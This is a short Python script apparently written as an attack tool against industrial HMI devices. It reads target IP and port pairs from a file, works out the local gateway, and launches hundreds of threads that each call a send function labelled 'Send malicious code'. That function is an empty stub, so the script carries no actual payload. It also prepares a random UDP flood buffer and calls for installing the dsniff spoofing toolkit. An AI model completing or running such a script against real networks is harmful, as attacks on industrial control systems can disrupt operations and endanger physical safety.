import os
import random
import socket
import subprocess
import threading
import time

ip_list = []
hmi = {}
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(2048)
sent = 0

#need to install "sudo apt install dsniff"

def clear_file():
    with open("./hmi_list.txt", "w") as f:
        f.write("")

def read_from_file():
    l = []
    with open("hmi_list.txt", "r") as f:
        for line in f:
            tu = line.strip("()").split(",")
            l.append((tu[0], tu[1]))
    return l

def send_cmd(ip, port):
    print("Send malicious code")
    pass

def attack_network():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))

    local_ip = s.getsockname()[0]
    build_ip = local_ip.split(".")
    gatway = f"{build_ip[0]}.{build_ip[1]}.{build_ip[2]}.1"

    print("[+] Start attacking HMI...")
    for (ip, port) in read_from_file():
        while threading.active_count() > 400:
            pass
        print(f"Start attack --> {ip}:{port}")
        threading.Thread(target=send_cmd, args=[ip, port]).start()
    clear_file()
    print("[+] attacking done")

attack_network()